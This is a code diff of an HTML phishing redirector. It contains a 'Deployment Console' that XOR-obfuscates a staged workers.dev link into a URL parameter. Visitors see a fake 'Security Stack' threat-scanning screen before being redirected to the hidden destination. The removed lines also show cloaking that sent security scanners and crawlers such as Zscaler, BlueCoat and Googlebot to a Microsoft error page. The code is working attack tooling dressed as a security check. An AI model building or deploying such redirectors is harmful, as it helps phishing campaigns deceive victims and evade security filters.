@@ -2,15 +2,48 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Verification</title>
-    <style id="antiFlash">body { display: none !important; }</style>
-    <script>
-        // XOR Key - MUST match the Generator key
-        const secretKey = "S3cur3_G4t3w4y"; 
+    <title>Gateway Workstation</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+        .card { background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); width: 100%; max-width: 450px; text-align: center; border: 1px solid #334155; }
+        input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 6px; border: 1px solid #475569; background: #0f172a; color: #38bdf8; box-sizing: border-box; }
+        button { background: #3b82f6; color: white; border: none; padding: 12px 24px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.2s; }
+        button:hover { background: #2563eb; }
+        #result { margin-top: 20px; padding: 15px; background: #020617; border-radius: 6px; border: 1px dashed #38bdf8; font-family: monospace; font-size: 12px; word-break: break-all; color: #10b981; display: none; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #3b82f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
 
+    <div id="bouncerUI" style="display:none;" class="card">
+        <div style="font-size: 18px; margin-bottom: 10px;">🛡️ Security Stack</div>
+        <p style="color: #94a3b8; font-size: 14px;">Scanning link for potential threats...</p>
+        <div class="spinner"></div>
+    </div>
+
+    <div id="generatorUI" class="card">
+        <h2 style="margin-top:0; color:#38bdf8;">Deployment Console</h2>
+        <p style="font-size: 13px; color: #94a3b8;">Paste your Stage 1 Link (Worker) below:</p>
+        <input type="text" id="targetLink" placeholder="https://...workers.dev/#key">
+        <button onclick="processLink()">ENCRYPT & MERGE</button>
+        <div id="result"></div>
+    </div>
+
+    <script>
+        const secretKey = "S3cur3_G4t3w4y";
+
+        // 1. Encryption Logic
+        function encrypt(text) {
+            let result = "";
+            for (let i = 0; i < text.length; i++) {
+                result += String.fromCharCode(text.charCodeAt(i) ^ secretKey.charCodeAt(i % secretKey.length));
+            }
+            return btoa(result).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+        }
+
+        // 2. Decryption Logic
         function decrypt(encoded) {
-            // URL-Safe Base64 decode
             const binary = atob(encoded.replace(/-/g, '+').replace(/_/g, '/'));
             let result = "";
             for (let i = 0; i < binary.length; i++) {
@@ -19,78 +52,37 @@
             return result;
         }
 
-        (function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const payload = urlParams.get('p');
-            
+        // 3. Main Controller
+        window.onload = function() {
+            const params = new URLSearchParams(window.location.search);
+            const payload = params.get('p');
+
             if (payload) {
-                const userAgent = navigator.userAgent.toLowerCase();
-                const hardBots = ["googlebot", "bingbot", "zscaler", "bluecoat", "headless", "lighthouse", "inspect"];
-                if (hardBots.some(bot => userAgent.includes(bot))) {
-                    window.location.replace("https://learn.microsoft.com/en-us/errors/404");
-                    return;
-                }
-
-                document.addEventListener("DOMContentLoaded", function() {
-                    document.getElementById("antiFlash").remove();
-                    document.getElementById("generatorUI").style.display = "none";
-                    document.getElementById("bouncerUI").style.display = "flex";
-                    
-                    setTimeout(function() {
-                        try {
-                            const destination = decrypt(payload);
-                            window.location.replace(destination);
-                        } catch(e) {
-                            window.location.replace("https://www.microsoft.com/en-us/error");
-                        }
-                    }, 2800); 
-                });
-            } else {
-                document.addEventListener("DOMContentLoaded", function() {
-                    document.getElementById("antiFlash").remove();
-                });
+                // If link is clicked
+                document.getElementById('generatorUI').style.display = 'none';
+                document.getElementById('bouncerUI').style.display = 'block';
+                
+                setTimeout(() => {
+                    try {
+                        window.location.replace(decrypt(payload));
+                    } catch(e) {
+                        window.location.replace("https://www.microsoft.com");
+                    }
+                }, 2800);
             }
-        })();
-    </script>
-    <style>
-        body { font-family: 'Segoe UI', sans-serif; background-color: #f5f5f5; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .container { background: white; padding: 40px; border-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); text-align: center; width: 100%; max-width: 400px; border: 1px solid #e1e1e1; }
-        .spinner { border: 2px solid #f3f3f3; border-top: 2px solid #0067b8; border-radius: 50%; width: 28px; height: 28px; animation: spin 0.8s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #generatorUI input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 2px; }
-        #generatorUI button { background: #0067b8; color: white; border: none; padding: 12px; cursor: pointer; width: 100%; font-weight: 600; }
-        #result { margin-top: 20px; font-size: 11px; word-break: all; color: #0067b8; background: #f9f9f9; padding: 10px; border: 1px dashed #0067b8; }
-    </style>
-</head>
-<body>
-    <div id="bouncerUI" class="container" style="display:none; flex-direction: column;">
-        <div style="font-weight:600; font-size:18px; color:#5e5e5e; margin-bottom:10px;">🛡️ Security Stack</div>
-        <div style="font-size:15px;">Scanning link for threats...</div>
-        <div class="spinner"></div>
-        <div style="font-size:12px; color:#666;">Verifying secure connection to destination.</div>
-    </div>
+        };
 
-    <div id="generatorUI" class="container">
-        <h3>Encrypted Deployment Console</h3>
-        <input type="text" id="target" placeholder="Paste Stage 1 Worker Link">
-        <button onclick="generate()">ENCRYPT & PROTECT</button>
-        <div id="result"></div>
-    </div>
-
-    <script>
-        const secretKey = "S3cur3_G4t3w4y"; 
-        function encrypt(text) {
-            let result = "";
-            for (let i = 0; i < text.length; i++) {
-                result += String.fromCharCode(text.charCodeAt(i) ^ secretKey.charCodeAt(i % secretKey.length));
-            }
-            return btoa(result).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
-        }
-        function generate() {
-            const target = document.getElementById('target').value;
-            if(!target) return;
-            const encrypted = encrypt(target);
-            document.getElementById('result').innerText = window.location.origin + window.location.pathname + "?p=" + encrypted;
+        // 4. Button Logic
+        function processLink() {
+            const input = document.getElementById('targetLink').value;
+            if(!input) { alert("Please paste a link first!"); return; }
+            
+            const encrypted = encrypt(input);
+            const finalUrl = window.location.origin + window.location.pathname + "?p=" + encrypted;
+            
+            const resultDiv = document.getElementById('result');
+            resultDiv.innerText = finalUrl;
+            resultDiv.style.display = 'block';
         }
     </script>
 </body>
